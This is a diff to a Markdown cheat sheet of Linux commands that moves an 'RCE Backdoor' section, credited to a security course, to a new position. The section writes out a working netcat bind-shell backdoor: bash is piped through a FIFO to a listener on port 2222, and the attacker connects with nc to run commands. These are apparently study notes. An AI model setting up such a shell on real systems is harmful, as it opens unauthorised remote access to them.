@@ -35,8 +35,8 @@ Any text after a # in an example is a remark or comment, which explains what the
     - [List users and groups](#list-users-and-groups)
 - [TUI](#tui)
 - [Advanced](#advanced)
-    - [RCE Backdoor](#rce-backdoor)
     - [Script snippets](#script-snippets)
+    - [RCE Backdoor](#rce-backdoor)
 - [Resources](#resources)
 
 <!-- /TOC -->
@@ -351,17 +351,6 @@ whiptail   # Create a dialog box
 ```
 
 # Advanced
-## RCE Backdoor
-From AntiSyphon course
-```sh
-# Victim
-mknod backpipe p  # Create block or character device special files, -p FIFO
-/bin/bash 0<backpipe | nc -l 2222 1>backpipe # Listen on port 2222, route to backpipe file and run contents of backpipe file in bash
-
-# Attacker
-nc {hostname/ip} {port e.g. 2222}  # Connect to remote port for RCE
-{commands}
-```
 
 ## Script snippets
 Checks for prerequisite input and applications
@@ -375,6 +364,18 @@ command -v nmap >/dev/null 2>&1 || echo "Error: The application 'nmap' is not in
 # Check for input file
 [ ! -f input.file ] && echo "Error: The file 'input.file' does not exist. Create the file with a list of IPs to scan, separated by carriage return." >&2 && exit 1
 
+```
+
+## RCE Backdoor
+From AntiSyphon course
+```sh
+# Victim
+mknod backpipe p  # Create block or character device special files, -p FIFO
+/bin/bash 0<backpipe | nc -l 2222 1>backpipe # Listen on port 2222, route to backpipe file and run contents of backpipe file in bash
+
+# Attacker
+nc {hostname/ip} {port e.g. 2222}  # Connect to remote port for RCE
+{commands}
 ```
 
 # Resources
